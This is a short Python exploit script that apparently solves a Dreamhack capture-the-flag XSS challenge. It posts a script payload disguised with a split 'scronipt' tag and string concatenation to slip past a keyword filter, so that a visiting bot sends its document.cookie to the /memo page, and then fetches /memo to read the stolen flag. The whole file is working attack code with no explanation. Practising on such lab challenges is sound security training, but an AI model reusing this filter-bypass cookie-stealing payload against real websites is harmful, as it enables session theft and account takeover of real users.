import requests

HOST = "http://host3.dreamhack.games"
PORT = "11169"
ATTACK_URI = "/flag"
PAYLOAD = "<scronipt>document['locatio'+'n'].href='/memo?memo='+document.cookie;<scronipt>"
POST_DATA = {"param" : PAYLOAD}
GET_FLAG = "/memo"

URL = HOST + ":" + PORT + ATTACK_URI

resp = requests.post(URL, data=POST_DATA)
print(resp.text)

URL = HOST + ":" + PORT + GET_FLAG

resp = requests.get(URL)
print(resp.text)